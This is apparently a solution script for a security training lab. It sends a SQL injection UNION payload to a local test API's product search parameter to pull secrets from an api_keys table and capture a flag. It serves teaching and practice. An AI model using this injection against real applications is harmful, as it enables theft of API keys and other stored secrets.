#!/usr/bin/env bash
# Lab 12 — three columns come back, so three columns go in.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9120}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab12

"$H5I" browser open "$URL/api/products?q=compass" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 \
    --set "query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- " | flag
